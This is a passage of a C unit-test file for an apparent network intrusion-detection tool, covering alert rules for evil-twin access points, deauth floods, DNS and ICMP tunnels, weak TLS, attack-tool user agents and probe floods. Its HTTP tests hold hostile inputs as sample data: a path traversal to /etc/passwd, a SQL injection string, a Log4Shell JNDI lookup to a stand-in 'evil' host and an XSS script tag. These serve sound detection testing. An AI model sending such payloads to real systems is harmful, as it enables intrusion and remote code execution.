    uint8_t a[6] = {0xaa,0xbb,0xcc,0x00,0x00,0x01};
    uint8_t b[6] = {0x11,0x22,0x33,0x00,0x00,0x02};
    add_beacon(&s, "A", a, "WPA2");
    add_beacon(&s, "B", b, "WPA2");
    s.beacon_aps[0].rssi_min_60s = -80; s.beacon_aps[0].rssi_max_60s = -60;
    s.beacon_aps[1].rssi_min_60s = -85; s.beacon_aps[1].rssi_max_60s = -60;
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_EVIL_TWIN_PROXIMITY) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── Evil-twin Phase 4: attack-chain correlation ──────────── */

/* Recent deauth flood targeting the SSID's "real" half AND a
 * same-cipher twin sibling → CRIT EVIL_TWIN with twin-chain key,
 * detail "attack-in-progress", and the rogue BSSID marked tainted. */
static void test_evil_twin_attack_chain_fires_crit(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t real[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t twin[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", real, "WPA2");
    add_beacon(&s, "Cafe-Net", twin, "WPA2");
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, real, 7, 20);
    s.deauth_events[0].last_seen = time(NULL);  /* inside the 5s window */

    alerts_update(&s);

    /* twin-chain CRIT alert is present */
    int found_chain = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type != ALERT_TYPE_EVIL_TWIN) continue;
        if (strstr(s.alerts[k].key, "twin-chain:Cafe-Net") == NULL) continue;
        found_chain = 1;
        ASSERT_EQ((int)s.alerts[k].sev, (int)ALERT_SEV_CRIT);
        ASSERT(strstr(s.alerts[k].detail, "attack-in-progress") != NULL);
        ASSERT(strstr(s.alerts[k].detail, "real=aa:bb:cc:01:02:03") != NULL);
        ASSERT(strstr(s.alerts[k].detail, "twin=11:22:33:44:55:66") != NULL);
        break;
    }
    ASSERT_EQ(found_chain, 1);

    /* twin BSSID is now tainted; real BSSID is NOT. */
    ASSERT_EQ(evil_twin_bssid_is_tainted(twin), 1);
    ASSERT_EQ(evil_twin_bssid_is_tainted(real), 0);
}

/* Stale deauth (older than 5s) — chain alert does not fire even
 * though the twin pair is present and flood=1. */
static void test_evil_twin_attack_chain_stale_deauth_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t real[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t twin[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", real, "WPA2");
    add_beacon(&s, "Cafe-Net", twin, "WPA2");
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, real, 7, 20);
    s.deauth_events[0].last_seen = time(NULL) - 60;  /* well outside 5s */

    alerts_update(&s);

    for (int k = 0; k < s.alert_count; k++) {
        ASSERT(strstr(s.alerts[k].key, "twin-chain:") == NULL);
    }
    ASSERT_EQ(evil_twin_bssid_is_tainted(twin), 0);
}

/* Deauth targets a BSSID with no twin sibling — chain alert does
 * not fire (DEAUTH_FLOOD itself still fires from the existing rule). */
static void test_evil_twin_attack_chain_no_twin_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t solo[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Solo-Net", solo, "WPA2");
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, solo, 7, 20);
    s.deauth_events[0].last_seen = time(NULL);

    alerts_update(&s);
    for (int k = 0; k < s.alert_count; k++) {
        ASSERT(strstr(s.alerts[k].key, "twin-chain:") == NULL);
    }
    ASSERT_EQ(evil_twin_bssid_is_tainted(solo), 0);
}

/* Twin pair present but flood=0 (deauth count below threshold) →
 * no chain alert. The flood flag is the trigger, not raw presence. */
static void test_evil_twin_attack_chain_no_flood_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t real[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t twin[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", real, "WPA2");
    add_beacon(&s, "Cafe-Net", twin, "WPA2");
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, real, 7, 20);
    s.deauth_events[0].flood     = 0;             /* below threshold */
    s.deauth_events[0].last_seen = time(NULL);

    alerts_update(&s);
    for (int k = 0; k < s.alert_count; k++) {
        ASSERT(strstr(s.alerts[k].key, "twin-chain:") == NULL);
    }
}

/* Symmetry — deauth targeting the OTHER half of the pair flips which
 * BSSID gets marked tainted. The rule doesn't pre-assume "first AP =
 * real"; the deauth target tells us which side is being defended. */
static void test_evil_twin_attack_chain_reverse_direction(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t real[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t twin[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", real, "WPA2");
    add_beacon(&s, "Cafe-Net", twin, "WPA2");
    /* Deauth target is `twin` this time — by the rule's logic, that
     * makes `twin` the "real" half being defended and `real` the rogue. */
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, twin, 7, 20);
    s.deauth_events[0].last_seen = time(NULL);

    alerts_update(&s);
    ASSERT_EQ(evil_twin_bssid_is_tainted(real), 1);
    ASSERT_EQ(evil_twin_bssid_is_tainted(twin), 0);
}

/* Tainted BSSID expires after EVIL_TWIN_TAINT_TTL_SECS. We can't easily
 * fake the system clock without restructuring the tracker, so this test
 * exercises the boundary by directly poking the stored timestamp via the
 * clear/mark API surface. We simulate "long ago" via the clear-after-fire
 * path and a fresh tracker lookup. */
static void test_evil_twin_taint_clear_drops_entries(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t real[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t twin[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "Cafe-Net", real, "WPA2");
    add_beacon(&s, "Cafe-Net", twin, "WPA2");
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, real, 7, 20);
    s.deauth_events[0].last_seen = time(NULL);
    alerts_update(&s);
    ASSERT_EQ(evil_twin_bssid_is_tainted(twin), 1);

    evil_twin_taint_clear();
    ASSERT_EQ(evil_twin_bssid_is_tainted(twin), 0);
}

/* ── Phase 6 end-to-end attack chain ────────────────────── */

/* The 5 acceptance criteria from the original copilot issue, exercised
 * in one scenario:
 *   1. Same-cipher diff-OUI twin pair        → twin-fp WARN
 *   2. Vendor-IE fingerprint hashes differ    → escalates to CRIT
 *   3. RSSI swing on the twin side ≥ 15 dBm  → EVIL_TWIN_PROXIMITY
 *   4. Deauth flood on real BSSID            → twin-chain CRIT + taint
 *   5. Clean baseline (single AP, no twin)   → no false fires
 *
 * We need scope a twins_snapshot here too — the alerts engine only
 * exercises Phases 1-4, but the materialised episode (Phase 5) is part
 * of the contract operators see. */

#include "twins.h"

static void test_e2e_full_attack_chain(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);

    /* Phase 1/2: twin pair, diff OUI, distinct vendor-IE hashes. */
    uint8_t real[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t twin[6] = {0x00,0x13,0x37,0x44,0x55,0x66};  /* Hak5 OUI bonus */
    add_beacon(&s, "Cafe-Net", real, "WPA2");
    add_beacon(&s, "Cafe-Net", twin, "WPA2");
    s.beacon_aps[0].signal_dbm        = -75;
    s.beacon_aps[1].signal_dbm        = -40;
    s.beacon_aps[0].fp.vendor_ies_hash = 0xfeedfaceu;
    s.beacon_aps[1].fp.vendor_ies_hash = 0xdeadbeefu;
    /* Phase 3: twin side has a 25 dBm RSSI swing. */
    s.beacon_aps[1].rssi_min_60s = -70;
    s.beacon_aps[1].rssi_max_60s = -45;
    /* Phase 4: deauth flood on the real BSSID inside the 5s window. */
    uint8_t client[6] = {0x99,0x99,0x99,0x99,0x99,0x99};
    add_deauth_flood_full(&s, client, real, 7, 20);
    s.deauth_events[0].last_seen = time(NULL);

    alerts_update(&s);
    twins_snapshot(&s);

    /* Acceptance 1+2: a CRIT EVIL_TWIN under twin-fp (hash mismatch
     * already escalated this branch). */
    int found_fp = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type != ALERT_TYPE_EVIL_TWIN) continue;
        if (strstr(s.alerts[k].key, "twin-fp:Cafe-Net") == NULL) continue;
        ASSERT_EQ((int)s.alerts[k].sev, (int)ALERT_SEV_CRIT);
        found_fp = 1;
        break;
    }
    ASSERT_EQ(found_fp, 1);

    /* Acceptance 3: proximity alert on the twin BSSID. */
    int found_prox = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type != ALERT_TYPE_EVIL_TWIN_PROXIMITY) continue;
        if (strstr(s.alerts[k].key, "twin-prox:00:13:37") == NULL) continue;
        found_prox = 1;
        break;
    }
    ASSERT_EQ(found_prox, 1);

    /* Acceptance 4: chain CRIT + taint on twin BSSID. */
    int found_chain = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type != ALERT_TYPE_EVIL_TWIN) continue;
        if (strstr(s.alerts[k].key, "twin-chain:Cafe-Net") == NULL) continue;
        ASSERT_EQ((int)s.alerts[k].sev, (int)ALERT_SEV_CRIT);
        ASSERT(strstr(s.alerts[k].detail, "attack-in-progress") != NULL);
        found_chain = 1;
        break;
    }
    ASSERT_EQ(found_chain, 1);
    ASSERT_EQ(evil_twin_bssid_is_tainted(twin), 1);

    /* Phase 5: materialised episode with all flags set. The real AP
     * here is the deauthed one (taint-override pins assignment). */
    ASSERT_EQ(s.twin_episode_count, 1);
    ASSERT(memcmp(s.twin_episodes[0].real_bssid, real, 6) == 0);
    ASSERT(memcmp(s.twin_episodes[0].twin_bssid, twin, 6) == 0);
    ASSERT_EQ(s.twin_episodes[0].attack_in_progress, 1);
    ASSERT_EQ(s.twin_episodes[0].attacker_oui,        1);
    ASSERT_EQ(s.twin_episodes[0].hash_mismatch,       1);
}

/* Acceptance 5: a clean baseline (one AP, no peers, no deauth) yields
 * no evil-twin alerts and no twin episodes. Defends against the chain
 * accidentally firing under realistic conditions. */
static void test_e2e_clean_baseline_no_alerts(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t solo[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    add_beacon(&s, "Home-Wifi", solo, "WPA2");
    s.beacon_aps[0].signal_dbm = -55;
    alerts_update(&s);
    twins_snapshot(&s);

    for (int k = 0; k < s.alert_count; k++) {
        ASSERT(s.alerts[k].type != ALERT_TYPE_EVIL_TWIN);
        ASSERT(s.alerts[k].type != ALERT_TYPE_EVIL_TWIN_PROXIMITY);
    }
    ASSERT_EQ(s.twin_episode_count, 0);
}

/* ── DNS tunnel ───────────────────────────────────────────── */

static void test_dns_tunnel_fires_on_long_subdomain_burst(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* 20 queries to evil.example, half with a long encoded subdomain. */
    for (int i = 0; i < 20; i++) {
        char qname[80];
        if (i % 2 == 0) {
            /* 32-char hex-encoded label = "tunnel payload". */
            snprintf(qname, sizeof(qname),
                     "abcdef0123456789abcdef0123456789.evil.example");
        } else {
            snprintf(qname, sizeof(qname), "short%d.evil.example", i);
        }
        add_dns_query(&s, "192.168.1.5", qname);
    }
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DNS_TUNNEL);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_dns_tunnel_normal_traffic_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* 30 normal queries to one popular parent — no long subdomains. */
    for (int i = 0; i < 30; i++) {
        char qname[64];
        snprintf(qname, sizeof(qname), "a%d.google.com", i);
        add_dns_query(&s, "192.168.1.5", qname);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_DNS_TUNNEL), -1);
}

static void test_dns_tunnel_few_long_no_fire(void) {
    /* Long subdomain count below threshold (8) — silent. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 20; i++) {
        char qname[80];
        if (i < 3) {
            snprintf(qname, sizeof(qname),
                     "abcdef0123456789abcdef0123456789.example.com");
        } else {
            snprintf(qname, sizeof(qname), "x%d.example.com", i);
        }
        add_dns_query(&s, "192.168.1.5", qname);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_DNS_TUNNEL), -1);
}

/* ── ICMP tunnel (#40) ───────────────────────────────────── */

static void add_icmp_echo(sloth_state_t *s, const char *src, const char *dst,
                          uint16_t payload_len, int is_v6) {
    if (s->icmp_log_count >= MAX_ICMP_LOG) return;
    icmp_log_entry_t *e = &s->icmp_log[s->icmp_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src, sizeof(e->src), "%s", src);
    snprintf(e->dst, sizeof(e->dst), "%s", dst);
    e->type        = is_v6 ? 128 : 8;   /* echo request */
    e->is_v6       = is_v6 ? 1 : 0;
    e->payload_len = payload_len;
    e->ts          = time(NULL);
}

static void test_icmp_tunnel_fires(void) {
    /* 8 oversized echo requests one pair → covert channel. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 8; i++)
        add_icmp_echo(&s, "10.0.0.5", "8.8.8.8", (uint16_t)(512 + i), 0);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ICMP_TUNNEL);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_icmp_tunnel_small_pings_no_fire(void) {
    /* Interactive ping: 56-byte payloads, well below the 64 B gate. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 30; i++)
        add_icmp_echo(&s, "10.0.0.5", "8.8.8.8", 56, 0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ICMP_TUNNEL), -1);
}

static void test_icmp_tunnel_single_large_ping_no_fire(void) {
    /* One large diagnostic ping (ping -s 1400) is below the volume
     * threshold — no alert. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_icmp_echo(&s, "10.0.0.5", "8.8.8.8", 1400, 0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ICMP_TUNNEL), -1);
}

static void test_icmp_tunnel_spread_across_pairs_no_fire(void) {
    /* Oversized echoes to many distinct hosts (e.g. an MTU sweep) never
     * concentrate on one pair, so no single bucket reaches threshold. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 12; i++) {
        char dst[46];
        snprintf(dst, sizeof(dst), "8.8.8.%d", i);
        add_icmp_echo(&s, "10.0.0.5", dst, 900, 0);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ICMP_TUNNEL), -1);
}

static void test_icmp_tunnel_v6_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 8; i++)
        add_icmp_echo(&s, "fe80::1", "fe80::2", 800, 1);
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ICMP_TUNNEL) >= 0);
}

static void test_icmp_tunnel_detail_keeps_full_v6_addrs(void) {
    /* The detail string bounds each address with %.45s to give the
     * compiler a provable read length (#58). 45 is the longest an IPv6
     * literal can be, so a real address must survive whole — this is the
     * assertion that catches a precision set too low. */
    const char *src = "2001:0db8:85a3:0000:0000:8a2e:0370:7334";
    const char *dst = "fdff:ffff:ffff:ffff:ffff:ffff:255.255.255.255";  /* 45 */
    ASSERT_EQ((int)strlen(dst), 45);

    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 8; i++)
        add_icmp_echo(&s, src, dst, 800, 1);
    alerts_update(&s);

    int idx = find_alert(&s, ALERT_TYPE_ICMP_TUNNEL);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, src) != NULL);
    ASSERT(strstr(s.alerts[idx].detail, dst) != NULL);
    /* And the tail survived too — the whole record fits in 256. */
    ASSERT(strstr(s.alerts[idx].detail, "ICMP covert channel") != NULL);
}

/* ── Weak TLS ────────────────────────────────────────────── */

static void add_tls(sloth_state_t *s, const char *src, const char *dst,
                     const char *host, const char *ver) {
    if (s->tls_log_count >= MAX_TLS_LOG) return;
    tls_log_entry_t *e = &s->tls_log[s->tls_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src,     sizeof(e->src),     "%s", src);
    snprintf(e->dst,     sizeof(e->dst),     "%s", dst);
    snprintf(e->host,    sizeof(e->host),    "%s", host);
    snprintf(e->tls_ver, sizeof(e->tls_ver), "%s", ver);
    e->ts = time(NULL);
}

static void test_weak_tls_tls10_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "legacy.example", "TLS 1.0");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WEAK_TLS);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_weak_tls_sslv3_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "legacy.example", "SSL 3.0");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_WEAK_TLS) >= 0);
}

static void test_weak_tls_tls13_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "modern.example", "TLS 1.3");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WEAK_TLS), -1);
}

static void test_weak_tls_tls12_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "modern.example", "TLS 1.2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WEAK_TLS), -1);
}

/* ── NO_MONITOR_MODE ─────────────────────────────────────── */

static void add_iface(sloth_state_t *s, const char *name, iface_mode_t mode) {
    iface_stat_t *f = &s->ifaces[s->iface_count++];
    memset(f, 0, sizeof(*f));
    snprintf(f->name, sizeof(f->name), "%s", name);
    f->mode = mode;
}

static void test_no_monitor_mode_fires_when_no_monitor_iface(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_iface(&s, "eth0",   IFACE_MODE_ETHER);
    add_iface(&s, "wlan0",  IFACE_MODE_WIFI);        /* managed, not monitor */
    add_iface(&s, "docker0", IFACE_MODE_ETHER);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_NO_MONITOR_MODE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT_STR(s.alerts[idx].title, "NO_MONITOR_MODE");
}

static void test_no_monitor_mode_no_fire_when_monitor_present(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_iface(&s, "eth0",   IFACE_MODE_ETHER);
    add_iface(&s, "wlan0mon", IFACE_MODE_MONITOR);   /* one monitor-mode radio */
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_NO_MONITOR_MODE), -1);
}

static void test_no_monitor_mode_no_fire_when_no_ifaces_yet(void) {
    /* Empty iface list — pre-first-poll. We wait for data before deciding
     * to fire so the alert doesn't scream during the boot window. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_NO_MONITOR_MODE), -1);
}

/* ── MITRE ATT&CK technique tagging ─────────────────────
 *
 * Every alert type maps to a canonical technique (or "" for host
 * posture). fire() writes the value into the alert record so the
 * TUI, JSONL, and posture report can all show it without going
 * back to the enum. */

static void test_attack_technique_populated_on_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    ASSERT_STR(s.alerts[idx].technique, "T1046");
}

static int is_digit_or_dot(char c) {
    return (c >= '0' && c <= '9') || c == '.';
}

static void test_attack_technique_shape_valid(void) {
    /* MITRE technique IDs are "T" + digits with optional ".NNN"
     * subtechnique. Confirm the table follows that shape (defensively
     * — a typo like "t1046" would produce garbage on export). */
    for (int t = 0; t < ALERT_TYPE_COUNT; t++) {
        const char *tech = alert_technique((alert_type_t)t);
        if (tech[0] == '\0') continue;  /* posture alerts */
        ASSERT_EQ((int)tech[0], (int)'T');
        for (int i = 1; tech[i]; i++)
            ASSERT(is_digit_or_dot(tech[i]));
    }
}

static void test_attack_technique_posture_alert_is_empty(void) {
    /* NO_MONITOR_MODE describes the operator's own capture rig, not
     * adversary behaviour — it must resolve to "" so JSONL omits the
     * technique field and reporting doesn't tag operator posture as
     * an attack technique. */
    ASSERT_STR(alert_technique(ALERT_TYPE_NO_MONITOR_MODE), "");
}

static void test_attack_technique_lookup_covers_all_alert_types(void) {
    /* Guardrail against forgetting to add a technique when landing a
     * new alert type: every enum value below ALERT_TYPE_COUNT must
     * return a non-NULL value (empty string is fine, NULL is not). */
    for (int t = 0; t < ALERT_TYPE_COUNT; t++) {
        const char *tech = alert_technique((alert_type_t)t);
        ASSERT(tech != NULL);
    }
}

/* ── Attack-tool User-Agent ──────────────────────────────── */

static void add_http(sloth_state_t *s, const char *src,
                      const char *host, const char *ua) {
    if (s->http_log_count >= MAX_HTTP_LOG) return;
    http_log_entry_t *e = &s->http_log[s->http_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src,        sizeof(e->src),        "%s", src);
    snprintf(e->host,       sizeof(e->host),       "%s", host);
    snprintf(e->method,     sizeof(e->method),     "GET");
    snprintf(e->path,       sizeof(e->path),       "/");
    snprintf(e->user_agent, sizeof(e->user_agent), "%s", ua);
    e->ts = time(NULL);
}

static void add_http_path(sloth_state_t *s, const char *src,
                           const char *host, const char *path) {
    if (s->http_log_count >= MAX_HTTP_LOG) return;
    http_log_entry_t *e = &s->http_log[s->http_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src,        sizeof(e->src),        "%s", src);
    snprintf(e->host,       sizeof(e->host),       "%s", host);
    snprintf(e->method,     sizeof(e->method),     "GET");
    snprintf(e->path,       sizeof(e->path),       "%s", path);
    e->ts = time(NULL);
}

static void test_attack_path_traversal_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/files?name=../../etc/passwd");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_sqli_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/products?id=1+union+select+null,version()");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_log4shell_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/?x=${jndi:ldap://evil/exploit}");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_xss_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/search?q=%3Cscript%3Ealert(1)%3C/script%3E");
    /* That's the encoded form; not all encoded variants are caught.
     * Use the raw-script variant which IS in the table. */
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/search?q=<script>alert(1)</script>");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_normal_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "google.com", "/search?q=hello+world");
    add_http_path(&s, "10.0.0.5", "example.com", "/api/v1/users/42");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ATTACK_PATH), -1);
}

static void test_attack_tool_ua_sqlmap_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http(&s, "10.0.0.5", "target.example",
             "sqlmap/1.7.5#stable (http://sqlmap.org)");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ATTACK_TOOL_UA);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_attack_tool_ua_nmap_case_insensitive(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http(&s, "10.0.0.5", "target.example", "Mozilla/5.0 (NMAP scripting)");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_TOOL_UA) >= 0);
}

static void test_attack_tool_ua_normal_browser_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http(&s, "10.0.0.5", "google.com",
             "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0");
    add_http(&s, "10.0.0.5", "example.com",
             "curl/8.4.0");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ATTACK_TOOL_UA), -1);
}

/* ── Probe flood ─────────────────────────────────────────── */

static void seed_probe_client(sloth_state_t *s, const uint8_t mac[6],
                                int frames, long elapsed_s) {
    if (s->probe_count >= MAX_PROBE_CLIENTS) return;
    probe_client_t *p = &s->probe_clients[s->probe_count++];
    memset(p, 0, sizeof(*p));
    memcpy(p->mac, mac, 6);
    p->frame_count = frames;
    p->last_seen   = time(NULL);
    p->first_seen  = p->last_seen - elapsed_s;
    p->signal_dbm  = -55;
    p->channel     = 6;
}

static void test_probe_flood_fires_on_high_rate(void) {
    /* 40 probes in 5 s = 8/s — above threshold. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 40, 5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PROBE_FLOOD);
    ASSERT(idx >= 0);
    /* PROBE_FLOOD is LOW — recon noise; real harm is PNL leakage. */
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_LOW);
}

static void test_probe_flood_low_total_no_fire(void) {
    /* 10 probes — below frame threshold (30). */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 10, 10);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PROBE_FLOOD), -1);
}

static void test_probe_flood_too_brief_no_fire(void) {
    /* 40 probes in 1s — elapsed below 5s window, suspect single
     * burst rather than sustained scan. Stay silent. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 40, 1);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PROBE_FLOOD), -1);
}

/* Kills the `frame_count < PROBE_FLOOD_FRAMES` threshold mutation
 * (`<` → `<=`): the rule fires *at* the threshold, not one above. */
static void test_probe_flood_exactly_at_frame_threshold_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    /* PROBE_FLOOD_FRAMES = 30, PROBE_FLOOD_WINDOW_S = 5. */
    seed_probe_client(&s, mac, 30, 5);
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_PROBE_FLOOD) >= 0);
}

/* Sibling boundary test: one frame below threshold stays silent. */
static void test_probe_flood_one_below_frame_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 29, 5);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PROBE_FLOOD), -1);
}

/* Kills the per-byte MAC-index mutations (lines 430-431): the detail
 * string must contain the offending client's MAC in canonical order. */
static void test_probe_flood_detail_contains_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Distinctive bytes so a wrong index would render visibly. */
    uint8_t mac[6] = {0x02,0x12,0x34,0x56,0x78,0x9a};
    seed_probe_client(&s, mac, 60, 10);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PROBE_FLOOD);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "02:12:34:56:78:9a") != NULL);
    /* Key is "probe_flood:<mac>" — same dedup story. */
    ASSERT(strstr(s.alerts[idx].key, "probe_flood:02:12:34:56:78:9a") != NULL);
}

/* ── KARMA / Pineapple ───────────────────────────────────── */

static void seed_karma_ap(sloth_state_t *s, const uint8_t bssid[6],
                           const char *const *ssids, int n_ssids) {
    if (s->beacon_count >= MAX_BEACON_APS) return;
